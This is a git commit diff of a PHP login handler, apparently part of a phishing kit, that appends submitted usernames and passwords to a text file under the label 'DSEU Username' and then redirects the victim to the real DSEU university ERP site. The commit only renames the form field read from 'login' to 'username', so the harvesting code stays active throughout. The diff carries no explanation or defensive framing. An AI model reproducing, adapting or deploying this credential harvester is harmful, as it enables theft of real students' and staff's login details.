53bad1fa17437bb4ad7a11033d9abc8e7bc34168
Dhruv kumar <134788310+dK1925402@users.noreply.github.com>
2023-07-30 07:17:56 +0000

    Update login.php

--- .sites/github/login.php
+++ .sites/github/login.php
@@ -1,6 +1,5 @@
 <?php
-
-file_put_contents("usernames.txt", "DSEU Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "DSEU Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://erp.dseu.ac.in/');
 exit();
 ?>
